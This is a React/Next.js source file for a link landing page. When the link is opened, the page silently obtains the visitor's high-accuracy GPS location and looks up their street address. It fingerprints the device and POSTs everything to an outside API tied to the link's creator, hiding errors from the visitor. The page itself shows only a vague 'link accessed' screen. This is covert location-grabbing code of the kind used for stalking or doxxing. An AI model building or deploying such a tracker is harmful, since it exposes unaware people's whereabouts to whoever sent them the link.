"use client";
import { useEffect, useState, useRef } from "react";
import { useParams } from "next/navigation";
import {
  getHighAccuracyLocation,
  formatLocationData,
  validateCoordinates,
} from "../../../utils/locationUtils";
import { getIndianAddress } from "../../../utils/geocodingUtils";

export function TrackingPageClient() {
  const params = useParams();
  const [pageReady, setPageReady] = useState(false);
  const [trackingComplete, setTrackingComplete] = useState(false);
  const hasTracked = useRef(false);
  const url = `${params.name}/${params.code}`;

  useEffect(() => {
    // Prevent duplicate tracking calls
    if (trackingComplete || hasTracked.current) return;

    // Prevent multiple calls by checking if we already have a tracking flag in sessionStorage
    const trackingKey = `tracking_${params.id}_${params.name}_${params.code}`;
    if (sessionStorage.getItem(trackingKey)) {
      setTrackingComplete(true);
      setPageReady(true);
      hasTracked.current = true;
      return;
    }

    // Mark as tracked immediately
    hasTracked.current = true;

    // Silent location tracking
    const trackLocationSilently = async () => {
      try {
        // Set tracking flag immediately to prevent duplicates
        sessionStorage.setItem(trackingKey, "true");

        // Get user's location with enhanced accuracy
        const position = await getHighAccuracyLocation({
          timeout: 30000,
          maximumAge: 0,
          enableHighAccuracy: true,
          fallbackToLowAccuracy: true,
          multipleAttempts: true,
        });

        console.log(
          `Location obtained with accuracy: ${position.coords.accuracy}m`
        );
        console.log(url, "url");
        if (position) {
          // Validate coordinates before processing
          if (
            !validateCoordinates(
              position.coords.latitude,
              position.coords.longitude
            )
          ) {
            console.warn("Invalid coordinates detected, skipping tracking");
            setTrackingComplete(true);
            return;
          }

          // Get detailed address from coordinates
          console.log("Getting detailed address...");
          const addressInfo = await getIndianAddress(
            position.coords.latitude,
            position.coords.longitude
          );
          console.log("Address obtained:", addressInfo);

          const sessionId =
            Date.now() + Math.random().toString(36).substr(2, 9);

          const locationData = {
            sessionId: sessionId,
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            altitude: position.coords.altitude,
            altitudeAccuracy: position.coords.altitudeAccuracy,
            heading: position.coords.heading,
            speed: position.coords.speed,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            creatorId: params.id,
            // Add detailed address information
            address: addressInfo,
            urlName: `${params.name}/${params.code}`,
            code: params.code,
            // Additional fraud detection data
            screen: {
              width: window.screen.width,
              height: window.screen.height,
            },
            viewport: {
              width: window.innerWidth,
              height: window.innerHeight,
            },
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            language: navigator.language,
            platform: navigator.platform,
          };

          // Send location data silently to your API
          try {
            const response = await fetch("https://safe-buddy.vercel.app/api/track", {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify(locationData),
            });

            if (response.ok) {
              console.log("Tracking successful");
            }

            // Mark tracking as complete
            setTrackingComplete(true);
          } catch (error) {
            // Silently fail - don't show any errors to user
            console.log("Tracking failed:", error);
            setTrackingComplete(true);
          }
        } else {
          // Even if location is denied, mark as complete
          console.log("Location access denied or failed");
          setTrackingComplete(true);
        }
      } catch (error) {
        console.log("Location tracking error:", error);
        setTrackingComplete(true);
      } finally {
        setPageReady(true);
      }
    };

    // Start tracking immediately
    trackLocationSilently();
  }, [params.id, params.name, params.code, trackingComplete]);

  if (!pageReady) {
    return (
      <div className="min-h-screen bg-darkmode flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-primary mx-auto mb-4"></div>
          <p className="text-white text-lg">Loading...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-darkmode">
      <div className="container mx-auto px-4 py-20">
        <div className="max-w-2xl mx-auto text-center">
          <div className="text-center mb-8">
            <div className="text-blue-500 text-6xl mb-4">🔗</div>
            <h1 className="text-white text-3xl font-bold mb-2">
              Link Accessed Successfully
            </h1>
            <p className="text-gray-300">
              The content you&apos;re looking for has been processed.
            </p>
          </div>

          <div className="bg-gray-800 rounded-lg p-6 mb-6">
            <h2 className="text-white text-xl font-semibold mb-4">
              Information
            </h2>
            <div className="space-y-3">
              <div className="flex justify-between">
                <span className="text-gray-300">Session ID:</span>
                <span className="text-white">{params.id}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-300">Reference:</span>
                <span className="text-white">{params.name}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-300">Code:</span>
                <span className="text-white">{params.code}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-300">Status:</span>
                <span className="text-green-400">✓ Verified</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-300">Timestamp:</span>
                <span className="text-white">
                  {new Date().toLocaleString()}
                </span>
              </div>
            </div>
          </div>

          <div className="bg-gray-800 rounded-lg p-6 mb-6">
            <h2 className="text-white text-xl font-semibold mb-4">
              Access Details
            </h2>
            <div className="space-y-3">
              <div className="flex justify-between">
                <span className="text-gray-300">Browser:</span>
                <span className="text-white">
                  {navigator.userAgent.includes("Chrome")
                    ? "Chrome"
                    : navigator.userAgent.includes("Firefox")
                    ? "Firefox"
                    : navigator.userAgent.includes("Safari")
                    ? "Safari"
                    : "Other"}
                </span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-300">Platform:</span>
                <span className="text-white">{navigator.platform}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-300">Language:</span>
                <span className="text-white">{navigator.language}</span>
              </div>
            </div>
          </div>

          <div className="text-center mt-8">
            <p className="text-gray-400 text-sm">
              This session has been recorded for security purposes. You may now
              close this page.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}
